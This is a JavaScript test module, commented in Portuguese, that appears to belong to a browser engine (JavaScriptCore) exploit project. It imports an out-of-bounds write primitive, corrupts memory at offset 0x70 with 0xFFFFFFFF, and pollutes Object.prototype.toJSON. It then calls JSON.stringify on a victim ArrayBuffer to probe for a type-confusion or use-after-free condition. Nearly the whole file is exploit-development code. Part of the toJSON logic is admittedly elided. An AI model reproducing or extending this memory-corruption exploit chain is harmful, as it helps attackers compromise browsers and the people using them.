// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const SPECIFIC_TEST_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
};

let callCount_toJSON_freeze_test = 0;

export async function runSpecificFreezingTest_0x70_FFFF_ControlPP(
    description,
    applyPrototypePollution // Novo parâmetro para controlar PP
) {
    const FNAME = `runSpecificFreezingTest_PP_Control<${description}>`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKey,
    } = SPECIFIC_TEST_PARAMS;

    logS3(`--- Iniciando Teste de Congelamento (Controle PP): ${description} ---`, "test", FNAME);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME);
    document.title = "Iniciando: " + description;

    callCount_toJSON_freeze_test = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionAppliedThisRun = false;
    let testPotentiallyFroze = true;
    let stepReached = "antes_pp_check";

    try {
        if (applyPrototypePollution) {
            logS3(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME);
            document.title = "Aplicando PP...";
            stepReached = "aplicando_pp";

            Object.defineProperty(Object.prototype, ppKey, {
                value: function() { // Usando a lógica "v2 - Refinado" do toJSON que estava nos scripts que congelavam
                    callCount_toJSON_freeze_test++;
                    const currentOperationThis = this;
                    if (callCount_toJSON_freeze_test === 1) {
                        document.title = `toJSON Chamada ${callCount_toJSON_freeze_test}`;
                        logS3(`[${ppKey} Poluído - v2 Refinado] Chamada ${callCount_toJSON_freeze_test}!`, "vuln", FNAME);
                    }
                    logS3(`  [Call ${callCount_toJSON_freeze_test}] typeof this: ${typeof currentOperationThis}`, "info", FNAME);
                    // ... (restante da lógica complexa do toJSON "v2 - Refinado" aqui, como no script que você forneceu)
                    // Para economizar espaço, não vou replicar toda a lógica interna do toJSON aqui,
                    // mas assuma que é a mesma do seu arquivo "testJsonTypeConfusionUAFSpeculative.mjs (v2 - Refinado)"
                    // que você indicou como sendo o que congelava.
                    // É importante que seja a mesma para replicar a condição.
                    // Exemplo simplificado do que ela fazia:
                    try {
                        let details = { byteLength: currentOperationThis.byteLength };
                        return { toJSON_executed: true, details: details };
                    } catch (e) {
                        logS3(`  [Call ${callCount_toJSON_freeze_test}] [${ppKey} Poluído] ERRO: ${e.message}`, "critical", FNAME);
                        return { toJSON_error: true, message: e.message };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionAppliedThisRun = true;
            logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
            stepReached = "pp_aplicada";
            document.title = "PP Aplicada";
        } else {
            logS3(`Poluição de Object.prototype.${ppKey} DESABILITADA para este teste.`, "info", FNAME);
            stepReached = "pp_desabilitada";
            document.title = "PP Desabilitada";
        }

        // Escrita OOB
        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME);
        stepReached = "antes_escrita_oob";
        document.title = "Antes Escrita OOB";
        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
        // Se congelar aqui, o log abaixo e o título não serão atualizados.
        logS3("Escrita OOB realizada.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = "Após Escrita OOB";
        testPotentiallyFroze = false; // Se chegou aqui, a escrita OOB em si não congelou

        // Somente chamar JSON.stringify se a PP foi aplicada
        if (applyPrototypePollution) {
            await PAUSE_S3(MEDIUM_PAUSE_S3);
            stepReached = "antes_stringify";
            document.title = "Antes Stringify";
            logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO COM PP)`, "info", FNAME);
            let stringifyResult = JSON.stringify(victim_ab); // Pode congelar aqui se PP + OOB Write anterior sensibilizaram
            stepReached = "apos_stringify";
            document.title = "Stringify Retornou";
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME);
        } else {
            logS3("JSON.stringify NÃO será chamado pois PP está desabilitada.", "info", FNAME);
            // Poderíamos tentar uma leitura da oob_dataview_real aqui para confirmar que sobreviveu, como na Fase 1.
            try {
                let testRead = oob_dataview_real.getUint32(0, true);
                logS3(`Leitura de controle da oob_dataview_real (offset 0) APÓS OOB write (sem PP): ${toHex(testRead)}`, "good");
                document.title = "OOB Write (sem PP) + Leitura DV OK";
            } catch (e_dv) {
                logS3(`ERRO ao ler oob_dataview_real após OOB write (sem PP): ${e_dv.message}`, "error");
                document.title = "ERRO Leitura DV Pós-OOB (sem PP)";
            }
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = "ERRO Principal Teste";
        testPotentiallyFroze = false;
        logS3(`Erro principal no teste (${description}): ${mainError.message}`, "error", FNAME);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME);
        if (testPotentiallyFroze && stepReached !== "apos_escrita_oob" && stepReached !== "apos_stringify" && !stepReached.startsWith("ERRO")) {
             // Se congelou antes de "Após Escrita OOB" ou antes de "Após Stringify" (se PP estava ativa)
            logS3(`O TESTE PODE TER CONGELADO. Último passo logado: ${stepReached}`, "warn", FNAME);
            document.title = `CONGELOU? Passo: ${stepReached}`;
        }
    }
    logS3(`--- Teste de Congelamento (Controle PP) Concluído: ${description} ---`, "test", FNAME);
    if (!testPotentiallyFroze || stepReached === "apos_escrita_oob" || stepReached === "apos_stringify") {
        // Se não congelou, ou congelou após a escrita OOB mas antes do stringify (se PP estava desabilitada)
        // ou completou stringify (se PP estava habilitada)
        document.title = "Teste Concluído Sem Congelamento Imediato na Escrita OOB";
    }
}
